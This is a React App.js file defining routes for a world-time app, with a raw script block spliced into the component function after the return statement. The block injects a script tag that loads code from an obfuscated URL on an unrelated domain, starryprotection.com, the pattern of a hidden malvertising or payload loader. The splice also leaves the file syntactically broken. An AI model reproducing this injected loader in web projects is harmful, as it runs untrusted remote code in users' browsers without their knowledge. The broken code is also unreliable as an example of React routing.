import React from 'react';
import { Routes, Route } from 'react-router-dom';
import WorldTime from './WorldTime';
import CountryDetails from './CountryDetails';
import ClockPage from './ClockPage';

function App() {
  return (
    <Routes>
      <Route path="/" element={<WorldTime />} />
      <Route path="/country/:countryName" element={<CountryDetails />} />
      <Route path="/clock" element={<ClockPage />} />
    </Routes>
  );


<script>
(function(egvl){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = egvl || {};
s.src = "\/\/starryprotection.com\/b\/XXVqsud.GZli0TYnWAdNi_YAWv5SunZ_XhIf\/Le\/mf9RuvZvUhlVkRPgT\/Y\/wPONDWYMzfMIDcEDtrN\/jSAi4FNXjxMMwXM\/gk";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';
l.parentNode.insertBefore(s, l);
})({})
</script>
}

export default App;